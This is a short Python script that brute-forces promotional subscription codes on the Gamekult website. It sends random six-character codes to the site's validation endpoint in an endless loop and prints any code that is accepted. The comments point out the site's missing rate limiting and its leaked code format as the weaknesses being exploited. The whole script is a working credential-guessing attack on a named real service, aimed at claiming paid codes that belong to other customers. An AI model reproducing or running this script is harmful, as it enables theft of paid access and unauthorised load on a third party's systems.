import requests
import string
import random

# Gamekult offers the possibility to benefit from 3 months subscription for free 
# to people who receive a specific code (for instance when buying something from a partner named JV Le Mag)
# Code has to be made of a combination of 6 caps letters and numbers
# It can be used on this page https://www.gamekult.com/utilisateur/s-abonner.html

# x = requests.get('https://www.gamekult.com/premium/validate-code?code=XXXXXX')   
# print(x.text)
# if code is not valid, returned message will contain "error"

# Why did I check this? Because a code I owned was already claimed, even though I never registered it.
# Why did I use random instead of autoincrement for code? For fun!

# Issues with Gamekult's dev here: 
# you can spam validation page has much as you want, with nothing but the code in the header
# validation page tells you expected format for code

print('--- Start ---\n')

i=0

while True:
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    url = 'https://www.gamekult.com/premium/validate-code?code=' + code + ''
    x = requests.get(url)
    
    i+=1
    
    if not x.text.find("error")>0:
        print('----------------------------')
        print('!!!!!!!!!!!!' + code + ' ' + str(i) + ' attempt(s)')
        print('----------------------------')
